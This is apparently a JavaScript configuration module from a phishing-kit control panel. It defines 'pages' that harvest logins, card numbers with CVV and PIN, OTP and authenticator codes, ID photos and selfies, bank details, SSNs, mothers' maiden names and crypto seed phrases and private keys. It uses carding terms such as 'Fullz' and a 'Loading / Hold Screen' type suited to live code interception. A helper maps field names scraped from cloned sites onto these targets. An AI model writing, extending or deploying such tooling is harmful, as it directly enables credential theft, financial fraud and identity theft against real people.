/**
 * ALP - X Pages Fields Config & Helpers
 * Schema configs, form type labels, aliases, and canonical mapping resolvers.
 */
const DemoPagesFields = (() => {
  // ─── Form type config ────────────────────────────────────────────────────────
  const FORM_TYPES = [
    { value: 'general',        label: 'General',              color: '#6b7280', bg: 'rgba(107,114,128,0.12)' },
    { value: 'loading',        label: 'Loading / Hold Screen',color: '#f59e0b', bg: 'rgba(245,158,11,0.12)'  },
    { value: 'login',          label: 'Login / Creds',        color: '#3b82f6', bg: 'rgba(59,130,246,0.12)'  },
    { value: 'credit_card',    label: 'Credit Card',          color: '#f59e0b', bg: 'rgba(245,158,11,0.12)' },
    { value: 'otp',            label: 'OTP / SMS',            color: '#10b981', bg: 'rgba(16,185,129,0.12)' },
    { value: 'email_verify',   label: 'Email Verification',   color: '#06b6d4', bg: 'rgba(6,182,212,0.12)'  },
    { value: 'authenticator',  label: 'Authenticator / 2FA',  color: '#f97316', bg: 'rgba(249,115,22,0.12)' },
    { value: 'id_upload',      label: 'ID Upload / Selfie',   color: '#ec4899', bg: 'rgba(236,72,153,0.12)' },
    { value: 'banking',        label: 'Banking Details',      color: '#14b8a6', bg: 'rgba(20,184,166,0.12)' },
    { value: 'personal_info',  label: 'Personal Info / Fullz',color: '#a855f7', bg: 'rgba(168,85,247,0.12)' },
    { value: 'kyc',            label: 'KYC / Document',       color: '#8b5cf6', bg: 'rgba(139,92,246,0.12)' },
    { value: 'crypto',         label: 'Crypto / Wallet',      color: '#eab308', bg: 'rgba(234,179,8,0.12)'  },
  ];

  function getTypeInfo(value) {
    return FORM_TYPES.find(t => t.value === value) || FORM_TYPES[0];
  }

  // ─── Expected fields config by form type ─────────────────────────────────────
  const EXPECTED_FIELDS_BY_TYPE = {
    loading: [],
    login: ['email', 'password'],
    credit_card: ['card_number', 'card_holder', 'expiry', 'cvv'],
    otp: ['otp_code'],
    email_verify: ['email_code'],
    authenticator: ['auth_code'],
    id_upload: ['id_front', 'id_back', 'selfie'],
    banking: ['bank_name', 'account_number', 'routing_number'],
    personal_info: ['full_name', 'dob', 'address', 'city', 'state', 'zip_code', 'country'],
    kyc: ['ssn', 'dob', 'mother_maiden'],
    crypto: ['seed_phrase', 'private_key', 'wallet_address', 'wallet_provider'],
    general: []
  };

  // ─── Field Groups ─────────────────────────────────────────────────────────────
  const FIELD_GROUPS = [
    { key: 'system',   label: '⚙️  System',                color: '#6b7280' },
    { key: 'card',     label: '💳  Credit Card',            color: '#f59e0b' },
    { key: 'login',    label: '🔐  Login & Password',       color: '#3b82f6' },
    { key: 'otp',      label: '🔢  OTP & Verification',     color: '#10b981' },
    { key: 'id',       label: '🪪  ID & Documents',         color: '#ec4899' },
    { key: 'billing',  label: '🧾  Billing Address',        color: '#f97316' },
    { key: 'banking',  label: '🏦  Banking Details',        color: '#14b8a6' },
    { key: 'personal', label: '👤  Personal Info',          color: '#a855f7' },
    { key: 'identity', label: '🛡️  Identity / KYC',         color: '#8b5cf6' },
    { key: 'crypto',   label: '🪙  Crypto / Web3',          color: '#eab308' },
  ];

  // ─── Canonical field aliases ─────────────────────────────────────────────────
  // Maps common custom names to canonical renderer field names
  const CANONICAL_FIELDS = [
    // system
    { value: '__keep__',          label: '⬜  Keep as-is',               icon: '⬜', group: 'system' },
    { value: '__skip__',          label: '🚫  Skip / Ignore',             icon: '🚫', group: 'system' },
    // Credit card
    { value: 'card_number',       label: '💳  Card Number',               icon: '💳', group: 'card' },
    { value: 'card_holder',       label: '🪙  Card Holder Name',          icon: '🪙', group: 'card' },
    { value: 'expiry',            label: '📅  Expiry Date',               icon: '📅', group: 'card' },
    { value: 'cvv',               label: '🔒  CVV / CVC',                 icon: '🔒', group: 'card' },
    { value: 'card_pin',          label: '🔢  Card PIN',                  icon: '🔢', group: 'card' },
    { value: 'card_type',         label: '🏷️  Card Type / Brand',         icon: '🏷️', group: 'card' },
    // Login
    { value: 'email',             label: '📧  Email / Username',          icon: '📧', group: 'login' },
    { value: 'username',          label: '👤  Username (Separate)',        icon: '👤', group: 'login' },
    { value: 'password',          label: '🔑  Password',                  icon: '🔑', group: 'login' },
    { value: 'pin',               label: '🔢  PIN Code',                  icon: '🔢', group: 'login' },
    { value: 'security_question', label: '❓  Security Question',          icon: '❓', group: 'login' },
    { value: 'security_answer',   label: '💬  Security Answer',           icon: '💬', group: 'login' },
    // OTP / Verification
    { value: 'otp_code',          label: '📱  OTP / SMS Code',            icon: '📱', group: 'otp' },
    { value: 'email_code',        label: '✉️  Email Verification Code',   icon: '✉️', group: 'otp' },
    { value: 'auth_code',         label: '🔑  Authenticator / 2FA Code',  icon: '🔑', group: 'otp' },
    { value: 'backup_code',       label: '🗝️  Backup / Recovery Code',    icon: '🗝️', group: 'otp' },
    { value: 'phone',             label: '📞  Phone Number',              icon: '📞', group: 'otp' },
    // ID / Document Upload
    { value: 'id_front',          label: '🪪  ID Front Photo',            icon: '🪪', group: 'id' },
    { value: 'id_back',           label: '🪪  ID Back Photo',             icon: '🪪', group: 'id' },
    { value: 'selfie',            label: '🤳  Selfie / Face Photo',       icon: '🤳', group: 'id' },
    { value: 'id_number',         label: '🏷️  ID / Passport Number',      icon: '🏷️', group: 'id' },
    { value: 'document_type',     label: '📄  Document Type',             icon: '📄', group: 'id' },
    { value: 'proof_of_address',  label: '🏠  Proof of Address Photo',    icon: '🏠', group: 'id' },
    // Billing
    { value: 'billing_name',      label: '🧾  Billing Name',              icon: '🧾', group: 'billing' },
    { value: 'billing_zip',       label: '📮  Billing ZIP',               icon: '📮', group: 'billing' },
    { value: 'billing_address',   label: '🏠  Billing Address',           icon: '🏠', group: 'billing' },
    { value: 'billing_city',      label: '🏙️  Billing City',              icon: '🏙️', group: 'billing' },
    { value: 'billing_state',     label: '📍  Billing State / Province',  icon: '📍', group: 'billing' },
    { value: 'billing_country',   label: '🌍  Billing Country',           icon: '🌍', group: 'billing' },
    // Banking
    { value: 'bank_name',         label: '🏦  Bank Name',                 icon: '🏦', group: 'banking' },
    { value: 'account_number',    label: '🔢  Account Number',            icon: '🔢', group: 'banking' },
    { value: 'routing_number',    label: '🔀  Routing Number',            icon: '🔀', group: 'banking' },
    { value: 'iban',              label: '🌐  IBAN',                      icon: '🌐', group: 'banking' },
    { value: 'swift_bic',         label: '⚡  SWIFT / BIC',               icon: '⚡', group: 'banking' },
    { value: 'sort_code',         label: '🗂️  Sort Code',                 icon: '🗂️', group: 'banking' },
    { value: 'bank_pin',          label: '🔢  Bank PIN / Online PIN',     icon: '🔢', group: 'banking' },
    { value: 'bank_passcode',     label: '🔑  Bank Passcode / Key',       icon: '🔑', group: 'banking' },
    { value: 'bank_branch',       label: '🏢  Bank Branch / Transit #',   icon: '🏢', group: 'banking' },
    // Personal Info
    { value: 'full_name',         label: '👤  Full Name',                 icon: '👤', group: 'personal' },
    { value: 'first_name',        label: '🅰️  First Name',                icon: '🅰️', group: 'personal' },
    { value: 'last_name',         label: '🅱️  Last Name',                 icon: '🅱️', group: 'personal' },
    { value: 'address',           label: '🏠  Street Address',            icon: '🏠', group: 'personal' },
    { value: 'city',              label: '🏙️  City',                      icon: '🏙️', group: 'personal' },
    { value: 'state',             label: '📍  State / Province',          icon: '📍', group: 'personal' },
    { value: 'zip_code',          label: '📮  ZIP / Postal Code',         icon: '📮', group: 'personal' },
    { value: 'country',           label: '🌍  Country',                   icon: '🌍', group: 'personal' },
    // Identity
    { value: 'ssn',               label: '🛡️  SSN',                       icon: '🛡️', group: 'identity' },
    { value: 'dob',               label: '🎂  Date of Birth',             icon: '🎂', group: 'identity' },
    { value: 'mother_maiden',     label: '👩  Mother\'s Maiden Name',     icon: '👩', group: 'identity' },
    { value: 'drivers_license',   label: '🚗  Driver\'s License #',       icon: '🚗', group: 'identity' },
    { value: 'tax_id',            label: '💼  Tax ID / EIN',              icon: '💼', group: 'identity' },
    { value: 'passport_number',   label: '🛂  Passport Number',           icon: '🛂', group: 'identity' },
    { value: 'national_id',       label: '🪪  National ID / NIN / CPF',  icon: '🪪', group: 'identity' },
    // Crypto
    { value: 'seed_phrase',       label: '🔑  Seed / Recovery Phrase',    icon: '🔑', group: 'crypto' },
    { value: 'private_key',       label: '🗝️  Private Key',               icon: '🗝️', group: 'crypto' },
    { value: 'wallet_address',    label: '🪙  Wallet Address',            icon: '🪙', group: 'crypto' },
    { value: 'wallet_provider',   label: '🔌  Wallet Provider',           icon: '🔌', group: 'crypto' },
    { value: 'keystore_json',     label: '📄  Keystore File (JSON)',      icon: '📄', group: 'crypto' },
    { value: 'keystore_pass',     label: '🔒  Keystore Password',         icon: '🔒', group: 'crypto' },
    { value: 'wallet_pin',        label: '🔢  Transaction / App PIN',     icon: '🔢', group: 'crypto' },
  ];

  // Auto-guess canonical field from raw HTML name
  function guessCanonical(rawName) {
    const n = rawName.toLowerCase().replace(/[_\-\s]/g, '');
    // Credit card
    if (/^(ccnumb?|cardnumb?|cardno|pan|ccno)$/.test(n)) return 'card_number';
    if (/^(ccholder?|cardholder?|ccname|cardname|nameoncard)$/.test(n)) return 'card_holder';
    if (/^(ccexp|cardexp|expiry|expdate|expirydate|mm\/yy|mmyy)$/.test(n)) return 'expiry';
    if (/^(cccvv|cvv2?|cvc2?|securitycode)$/.test(n)) return 'cvv';
    if (/^(cardpin|atmpin|ccpin)$/.test(n)) return 'card_pin';
    if (/^(cardtype|cardbrand|cardlogo|brand)$/.test(n)) return 'card_type';
    // Login
    if (/^(email|mail|user(name)?|login|userid)$/.test(n)) return 'email';
    if (/^(username|user|uname)$/.test(n)) return 'username';
    if (/^(pass(word)?|pwd|secret)$/.test(n)) return 'password';
    if (/^(pin|pincode|loginpin)$/.test(n)) return 'pin';
    if (/^(securityquestion|secquestion|question)$/.test(n)) return 'security_question';
    if (/^(securityanswer|secanswer|answer)$/.test(n)) return 'security_answer';
    // OTP / Verification codes
    if (/^(otp|otpcode|smscode|sms|verif(ication)?code)$/.test(n)) return 'otp_code';
    if (/^(emailcode|emailotp|emailverif(ication)?(code)?|mailcode)$/.test(n)) return 'email_code';
    if (/^(auth(enticator)?code|2fa(code)?|totp(code)?|googleauth|authcode)$/.test(n)) return 'auth_code';
    if (/^(backupcode|recoverycode|backupkey)$/.test(n)) return 'backup_code';
    if (/^(phone|tel|mobile|phonenumb?|cellphone)$/.test(n)) return 'phone';
    // Digit inputs — common split-code pattern (digit1, d1, code1, num1, input1, field1, box1, char1)
    if (/^(digit|d|code|num|input|field|box|char|step|n)\d+$/.test(n)) return 'auth_code';
    // ID / Document upload
    if (/^(idfront|frontid|idfrontphoto|frontphoto|idphoto)$/.test(n)) return 'id_front';
    if (/^(idback|backid|idbackphoto|backphoto)$/.test(n)) return 'id_back';
    if (/^(selfie|facephoto|selfiephoto|livephoto|faceimage)$/.test(n)) return 'selfie';
    if (/^(idnumb(er)?|passportnumb(er)?|licensenumb(er)?|documentnumb(er)?)$/.test(n)) return 'id_number';
    if (/^(documenttype|doctype|idtype)$/.test(n)) return 'document_type';
    if (/^(proofofaddress|poa|addressproof|utilitybill)$/.test(n)) return 'proof_of_address';
    // Billing
    if (/^(billingzip|zip|zipcode|postalcode|postcode)$/.test(n)) return 'billing_zip';
    if (/^(billingname)$/.test(n)) return 'billing_name';
    if (/^(billingaddress)$/.test(n)) return 'billing_address';
    if (/^(billingcity)$/.test(n)) return 'billing_city';
    if (/^(billingstate|billingregion|billingprovince)$/.test(n)) return 'billing_state';
    if (/^(billingcountry)$/.test(n)) return 'billing_country';
    // Banking
    if (/^(bankname|bank|bankingname)$/.test(n)) return 'bank_name';
    if (/^(accountnumb(er)?|acctno|accountno|acctnum)$/.test(n)) return 'account_number';
    if (/^(routingnumb(er)?|routingno|aba|abanumb(er)?)$/.test(n)) return 'routing_number';
    if (/^(iban)$/.test(n)) return 'iban';
    if (/^(swift|swiftcode|bic|swiftbic)$/.test(n)) return 'swift_bic';
    if (/^(sortcode)$/.test(n)) return 'sort_code';
    if (/^(bankpin|onlinepin|bankingpin)$/.test(n)) return 'bank_pin';
    if (/^(bankpasscode|bankpass|bankkey)$/.test(n)) return 'bank_passcode';
    if (/^(bankbranch|branch|branchcode|transitnumb(er)?|transitno)$/.test(n)) return 'bank_branch';
    // Personal info
    if (/^(fullname|completename)$/.test(n)) return 'full_name';
    if (/^(firstname|fname|givenname)$/.test(n)) return 'first_name';
    if (/^(lastname|lname|surname|familyname)$/.test(n)) return 'last_name';
    if (/^(address|streetaddress|street|addr|address1)$/.test(n)) return 'address';
    if (/^(city|town|locality)$/.test(n)) return 'city';
    if (/^(state|province|region)$/.test(n)) return 'state';
    if (/^(country|nation)$/.test(n)) return 'country';
    // Identity
    if (/^(ssn|socialsecurity|socialsecuritynumb(er)?)$/.test(n)) return 'ssn';
    if (/^(dob|birthdate|dateofbirth|birthday)$/.test(n)) return 'dob';
    if (/^(mothermaiden|maidenname|mothersmaiden(name)?)$/.test(n)) return 'mother_maiden';
    if (/^(driverslicense|dlnumb(er)?|licenseno)$/.test(n)) return 'drivers_license';
    if (/^(taxid|ein|tinnumb(er)?)$/.test(n)) return 'tax_id';
    if (/^(passportnumb(er)?|passportno|passport)$/.test(n)) return 'passport_number';
    if (/^(nationalid|nin|cpf|dni|cnic|nationalidcard)$/.test(n)) return 'national_id';
    // Crypto
    if (/^(seed|seedphrase|recoveryphrase|mnemonic|mnemonicphrase|phrase)$/.test(n)) return 'seed_phrase';
    if (/^(privatekey|pkey|pk|walletkey)$/.test(n)) return 'private_key';
    if (/^(walletaddress|walletaddr|pubaddr|publicaddress|ethaddr|btcaddr|soladdr)$/.test(n)) return 'wallet_address';
    if (/^(walletprovider|walletname|wallet|wallettype)$/.test(n)) return 'wallet_provider';
    if (/^(keystore|keystorejson|keystorefile)$/.test(n)) return 'keystore_json';
    if (/^(keystorepass(word)?|keystorepwd)$/.test(n)) return 'keystore_pass';
    if (/^(walletpin|tradepin|tradingpin)$/.test(n)) return 'wallet_pin';
    return '__keep__';
  }

  /**
   * Renders grouped <optgroup> HTML for a <select> element.
   * @param {string} selectedValue - Currently selected canonical value
   * @returns {string} HTML string of <optgroup> and <option> elements
   */
  function renderGroupedOptionsHtml(selectedValue) {
    const byGroup = {};
    CANONICAL_FIELDS.forEach(f => {
      if (!byGroup[f.group]) byGroup[f.group] = [];
      byGroup[f.group].push(f);
    });

    // Render system options first (no optgroup wrapper)
    let html = (byGroup['system'] || []).map(f =>
      `<option value="${f.value}" ${f.value === selectedValue ? 'selected' : ''}>${f.label}</option>`
    ).join('');

    // Then grouped optgroups
    FIELD_GROUPS.filter(g => g.key !== 'system').forEach(group => {
      const fields = byGroup[group.key] || [];
      if (!fields.length) return;
      html += `<optgroup label="${group.label}" style="color:${group.color};font-weight:700;">`;
      html += fields.map(f =>
        `<option value="${f.value}" ${f.value === selectedValue ? 'selected' : ''} style="color:#e5e7eb;font-weight:400;">${f.label}</option>`
      ).join('');
      html += `</optgroup>`;
    });
    return html;
  }

  /**
   * Detects split-digit input stems from a list of raw field names.
   * Returns an array of { stem, fields, canonicalSuggestion } for groups of 2+ fields with the same stem.
   */
  function detectDigitGroups(rawFields) {
    const stemMap = {};
    rawFields.forEach(f => {
      // e.g. digit1 → stem=digit, digit_1 → stem=digit, code-2 → stem=code
      const m = f.toLowerCase().match(/^([a-z_\-]+?)[\-_]?(\d+)$/);
      if (m) {
        const stem = m[1];
        if (!stemMap[stem]) stemMap[stem] = [];
        stemMap[stem].push(f);
      }
    });
    const groups = [];
    Object.entries(stemMap).forEach(([stem, fields]) => {
      if (fields.length >= 2) {
        // Guess what kind of code this is from the stem
        let canonicalSuggestion = 'auth_code';
        if (/otp|sms|verif/.test(stem)) canonicalSuggestion = 'otp_code';
        else if (/email|mail/.test(stem)) canonicalSuggestion = 'email_code';
        groups.push({ stem, fields, canonicalSuggestion });
      }
    });
    return groups;
  }

  return {
    FORM_TYPES,
    FIELD_GROUPS,
    EXPECTED_FIELDS_BY_TYPE,
    CANONICAL_FIELDS,
    getTypeInfo,
    guessCanonical,
    renderGroupedOptionsHtml,
    detectDigitGroups,
  };
})();

window.DemoPagesFields = DemoPagesFields;
